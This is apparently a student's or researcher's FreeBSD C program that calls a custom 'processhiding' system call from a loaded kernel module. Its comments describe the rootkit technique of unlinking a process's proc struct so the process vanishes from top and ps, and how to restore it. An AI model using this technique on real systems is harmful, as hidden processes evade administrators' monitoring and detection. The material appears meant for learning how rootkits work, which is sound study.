/* OK here we create our own system call and stick into the
system call table.
We did the same thing in Linux too. That is on the other 
virtual machine.
*/

#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/module.h>
#include <sys/proc.h>

int main(int argc, char** argv) {
// Every system call must have an associated number: that is how it can
// be called.
	int syscall_num = 0;
// The struct below will contain the meta-data about the system call.
	struct module_stat stat;

// OK so I need to pass in an address value into the called system
// call. This is only meant for the processhiding system call.
// I first call with the second parameter something other than 1
// like so:  ./interface processhiding 4 top
// This will cause the top process to be hidden and thus will not show
// either in the top output or the ps output. 
// This is essentially done by removing the proc structure corresponding
// to top from the list of procs maintained by the kernel.
// Once removed there was no way to put it back. Obviously the root kit
// authors dont want to put something back into the list.
// But I wanted to find out whether that is possible: and it is. 
// When the proc struct is removed from the list, I store that address
// in the third parameter that is passed to the system call below.
// That is the ptr variable below.
// When called for hiding the ptr variable is either null or uninitialized.
// On return from the call, the ptr variable will contain the address
// of the removed struct.
// I cant do anything with that returned value, it was just used to
// verify that the addresses are returned intact. Since this is supposed
// to be an output variable, I pass the address of ptr to the system call.

// Now when I want to restore the removed process, I manually pass
// the address returned earlier by the system call with the 
// second parameter as 1

// ./interface processhiding 1 top
// The third parameter is not needed so it can also be
// ./interface processhiding 1
// Now the ptr variable is initialized with the address and this
// is used by the system call to restore the removed proc
// back into the list. As long as the proc is running this
// address is valid because the kernel memory is not paged out
// - at least that is what I think. 
	 struct proc *   ptr ;
	if ( atoi(argv[2]) == 1) {
	 	ptr =   (struct proc *) strtoll(argv[3], (char **) NULL, 16);
	}

// I dont understand why the version number is filled in thus. Looks to
// me that this is an arbitrary value. The struct is defined in sys/module.h
// and the documentation states that this is how the version number should
// be initialized. But why?
	stat.version = sizeof(stat);
// OK, down here the modfind, will reach in and get the module id value
// that we are so keen on getting. The address of stat is passed
// and thus the meta-data is filled in. modstat will then get the meta-data
// associated with the module identified by mod id and fill that into stat.
	modstat(modfind(argv[1]), &stat);

// One of the meta-data pieces is the syscall number: which is the offset
// into the sys entry table. This table is an array of sysent structs.

	syscall_num = stat.data.intval;

//Finally execute the system call. While the actual implementing function  
// requires a thread pointer and a pointer to the set of arguments: the
// call site will only pass the syscall number and the arguments. Now
// an interrupt is issued and a dispatch function will bundle the thread
// pointer and the arguments and dispatch to the correct location in
// the kernel that contains the sys call implementing function.

//	printf("%d %d\n", syscall_num, atoi(argv[2]));

	syscall(syscall_num, atoi(argv[2]), argv[3], &ptr);
//	syscall(syscall_num,  argv[2]);

// Here I am printing the values and addresses of the command line
// variables. The values were printed to see whether an assignment
// in the system call function affects these userland variables.
// Answer: they do. The system call operating in kernel mode
// is manipulating the values at userland addresses.
// Of course that is because this is a poorly written system call.
// When kernel mode processes manipulate user mode data directly,
// the danger is that the user mode memory pages might be swapped out
// and now the kernel will receive a page fault and consequently panic.
// Machine reboots are needed. This might even be a DOS.

//	printf("%s %s \n %p %p", argv[1], argv[2], argv[1] , argv[2]);
	
	printf("%x\n", (unsigned int) ptr)  ;
	
}


